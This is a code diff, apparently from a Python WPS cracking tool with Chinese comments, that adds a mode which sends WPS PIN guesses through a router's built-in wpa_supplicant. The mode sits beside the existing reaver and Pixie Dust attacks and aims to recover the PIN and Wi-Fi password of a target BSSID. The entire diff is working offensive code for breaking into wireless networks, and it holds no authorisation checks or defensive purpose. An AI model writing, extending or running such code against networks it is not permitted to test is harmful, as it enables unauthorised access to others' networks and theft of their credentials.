@@ -11,6 +11,7 @@ from .wps_defaults import (
     DEFAULT_QUICK_SECONDS,
     DefaultPinCandidate,
     default_pin_candidates,
+    wps_sender,
 )
 from .wps_models import WpsTargetResult, WpsUpdate
 from .wps_observation import PIXIE_TOOL_MISSING, analyze
@@ -147,9 +148,10 @@ def run_pin_process(process_manager, command, session_id, workspace, budget,
 
 
 class QuickWpsCapture:
-    def __init__(self, process_manager, base_builder):
+    def __init__(self, process_manager, base_builder, command_runner=None):
         self.process_manager = process_manager
         self.base_builder = base_builder
+        self.command_runner = command_runner
 
     def _command(self, workspace, monitor_interface, target, options, workspace_manager,
                  cancel_event, index, suffix, run_mode, extra):
@@ -174,6 +176,14 @@ class QuickWpsCapture:
         bssid = normalize_bssid(target.bssid)
         label = str(target.ssid or bssid)
         target_session = f"{session_id}-t{index}"
+        sender = wps_sender(options)
+        # 系统 WPS 默认不跑离线 Pixie：离线 Pixie 仍由 reaver 注入实现，
+        # 部分驱动（如 MT7603E）在注入时可能挂掉，必须由用户显式勾选。
+        system_offline_pixie = sender == "system" and bool(
+            options.get("system_offline_pixie"))
+        system_client = None
+        system_error = ""
+        system_error_kind = ""
         seconds = _bounded_seconds(options.get("quick_seconds", DEFAULT_QUICK_SECONDS))
         rounds = _bounded_rounds(options.get("quick_rounds", DEFAULT_QUICK_ROUNDS))
         started = time.monotonic()
@@ -205,11 +215,69 @@ class QuickWpsCapture:
             if cancel_event is not None and cancel_event.is_set():
                 raise RuntimeError("WPS 任务已取消。")
 
+        def ensure_system_client():
+            """按需建立系统 WPS 客户端；不可用时抛 WpsSystemUnavailable。"""
+
+            nonlocal system_client, system_error, system_error_kind
+            if system_client is not None:
+                return system_client
+            if system_error:
+                from .wps_system_client import WpsSystemUnavailable
+                raise WpsSystemUnavailable(system_error, kind=system_error_kind)
+            from .wps_system_client import WpsSystemClient, WpsSystemUnavailable
+            if self.command_runner is None:
+                raise WpsSystemUnavailable("系统 WPS 缺少命令执行通道，无法启动。")
+            client = WpsSystemClient(self.command_runner, self.process_manager)
+            try:
+                client.open(workspace, monitor_interface, target_session, cancel_event)
+            except Exception as exc:
+                if isinstance(exc, WpsSystemUnavailable):
+                    system_error = str(exc)
+                    system_error_kind = str(getattr(exc, "kind", "") or "")
+                try:
+                    client.close()
+                except Exception:
+                    pass
+                raise
+            system_client = client
+            if diagnostic is not None:
+                diagnostic.event("system_wps_ready")
+            return client
+
+        def attempt_system(candidate, phase):
+            """用路由器自带的 wpa_supplicant 发一个 PIN。"""
+
+            nonlocal current_pin, status, system_error, system_error_kind
+            from .wps_system_client import WpsSystemUnavailable
+            current_pin = candidate.pin
+            status = "系统 WPS 正在尝试"
+            report(phase, candidate.pin, status, time.monotonic())
+            try:
+                client = ensure_system_client()
+                outcome, pin_value, psk_value = client.attempt(
+                    bssid, candidate.pin, seconds, cancel_event)
+            except WpsSystemUnavailable as exc:
+                system_error = str(exc)
+                system_error_kind = str(getattr(exc, "kind", "") or "")
+                raise
+            if outcome == "confirmed":
+                status = "系统 WPS 已确认"
+                if diagnostic is not None:
+                    diagnostic.event("system_wps_confirmed")
+                return pin_value, psk_value, False, ""
+            if outcome == "rejected":
+                status = "系统 WPS 已拒绝"
+                return "", "", True, ""
+            status = "系统 WPS 未在时限内确认"
+            return "", "", False, ""
+
         def attempt_candidate(candidate, phase):
             """跑一个在线候选；返回 (pin, psk, rejected, terminal)。"""
 
             nonlocal attempt_number, current_pin, status
             attempt_number += 1
+            if sender == "system":
+                return attempt_system(candidate, phase)
             candidate_options = options
             if source_rotation is not None:
                 candidate_options = source_rotation.next_options(options, cancel_event)
@@ -244,6 +312,10 @@ class QuickWpsCapture:
                         cancel_event, index, target_session, seconds, report)
                     offline_warning = warning or offline_warning
                     was_rejected = False
+                    if sender == "system" and found_pin:
+                        # 系统 WPS 模式只把 Pixie 当作算出 PIN，密码必须由
+                        # 系统 WPS 自己验证取得，不混用 reaver 的凭据来源。
+                        found_psk = ""
                 else:
                     found_pin, found_psk, was_rejected, found_terminal = attempt_candidate(candidate, phase)
                 if found_psk:
@@ -266,41 +338,72 @@ class QuickWpsCapture:
                     return True
             return False
 
-        for round_number in range(rounds):
-            if psk or terminal:
-                break
-            sequence = []
-            if round_number == 0:
-                # 第一轮：记住的 PIN → pin24 → 离线 Pin → 其余在线候选。
-                if remembered:
-                    sequence.append(("online", DefaultPinCandidate(remembered, "已记住"), "已记住的 PIN"))
-                if online:
-                    sequence.append((
-                        "online", online[0],
-                        f"秒 Pin 第1/{rounds}轮 第1/{len(online)}个"))
-                sequence.append(("offline", None, "离线 Pin（Pixie Dust）"))
-                for number, candidate in enumerate(online[1:], start=2):
-                    sequence.append((
-                        "online", candidate,
-                        f"秒 Pin 第1/{rounds}轮 第{number}/{len(online)}个"))
-            else:
-                # 后续轮只重复在线候选，离线 Pin 每个目标只跑一次。
-                for number, candidate in enumerate(online, start=1):
-                    sequence.append((
-                        "online", candidate,
-                        f"秒 Pin 第{round_number + 1}/{rounds}轮 第{number}/{len(online)}个"))
-            if run_sequence(sequence):
-                break
+        def verify_candidate(pin_value):
+            """确认已拿到的 PIN；系统 WPS 模式下沿用同一条通道。"""
 
-        if pin and not psk and not terminal:
-            verify_pin, verify_psk = self._verify(
+            if sender == "system":
+                client = ensure_system_client()
+                outcome, new_pin, new_psk = client.attempt(
+                    bssid, pin_value, seconds, cancel_event)
+                return (new_pin if outcome == "confirmed" else ""), new_psk
+            return self._verify(
                 workspace, monitor_interface, target, options, workspace_manager,
-                cancel_event, index, target_session, seconds, report, pin)
-            if verify_psk:
-                psk = verify_psk
-                ending = "已获取密码"
-            elif verify_pin:
-                pin = verify_pin
+                cancel_event, index, target_session, seconds, report, pin_value)
+
+        from .wps_system_client import WpsSystemUnavailable
+        try:
+            for round_number in range(rounds):
+                if psk or terminal:
+                    break
+                sequence = []
+                if round_number == 0:
+                    # 第一轮：记住的 PIN → pin24 → 离线 Pin → 其余在线候选。
+                    if remembered:
+                        sequence.append(("online", DefaultPinCandidate(remembered, "已记住"), "已记住的 PIN"))
+                    if online:
+                        sequence.append(("online", online[0],
+                                     f"秒 Pin 第1/{rounds}轮 第1/{len(online)}个"))
+                    if sender != "system" or system_offline_pixie:
+                        sequence.append(("offline", None, "离线 Pin（Pixie Dust）"))
+                    for number, candidate in enumerate(online[1:], start=2):
+                        sequence.append((
+                            "online", candidate,
+                            f"秒 Pin 第1/{rounds}轮 第{number}/{len(online)}个"))
+                else:
+                    # 后续轮只重复在线候选，离线 Pin 每个目标只跑一次。
+                    for number, candidate in enumerate(online, start=1):
+                        sequence.append((
+                            "online", candidate,
+                            f"秒 Pin 第{round_number + 1}/{rounds}轮 第{number}/{len(online)}个"))
+                if run_sequence(sequence):
+                    break
+
+            if pin and not psk and not terminal:
+                verify_pin, verify_psk = verify_candidate(pin)
+                if verify_psk:
+                    psk = verify_psk
+                    ending = "已获取密码"
+                elif verify_pin:
+                    pin = verify_pin
+        except WpsSystemUnavailable as exc:
+            kind = str(getattr(exc, "kind", "") or "")
+            reason = str(exc)
+            note = f"系统 WPS 用不了：{reason}"
+            if "reaver" not in note:
+                note += "请把秒 Pin 的发送方式改回 reaver 后重试。"
+            if diagnostic is not None:
+                diagnostic.event("system_wps_unavailable", kind=kind, reason=reason)
+            report("结束", "", "", started)
+            return WpsTargetResult(
+                bssid=bssid, ssid=label, mode="second", note=note,
+                unavailable_kind=kind, unavailable_reason=reason,
+                tried_seconds=max(0, int(time.monotonic() - started)))
+        finally:
+            if system_client is not None:
+                try:
+                    system_client.close()
+                except Exception:
+                    pass
 
         if psk:
             ending = "已获取密码"
